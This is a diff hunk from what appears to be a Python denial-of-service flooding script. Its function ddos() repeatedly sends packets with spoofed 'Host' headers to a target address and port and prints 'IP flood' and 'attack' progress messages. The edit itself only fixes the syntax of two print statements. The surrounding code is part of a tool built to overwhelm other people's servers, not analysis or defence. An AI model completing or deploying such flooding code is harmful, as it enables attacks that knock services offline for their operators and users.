@@ -52,9 +52,9 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_id += 2
-                print(f{Fore.GREEN}Malack {Fore.YELLOW} IP flood {Fore.WHITE}" +str(id)+ "{Style.RESET_ALL}"
+                print(f"{Fore.GREEN}Malack {Fore.YELLOW} IP flood {Fore.WHITE}" +str(id)+ "{Style.RESET_ALL}")
             except socket.error:
-                print("[💥]\033[1;35m Finnaly attack \033[0;31m Check ip in check host \033[0m")
+                print(f"[💥]\033[1;35m Finnaly attack \033[0;31m Check ip in check host \033[0m")
                 break
                 s.close()
 
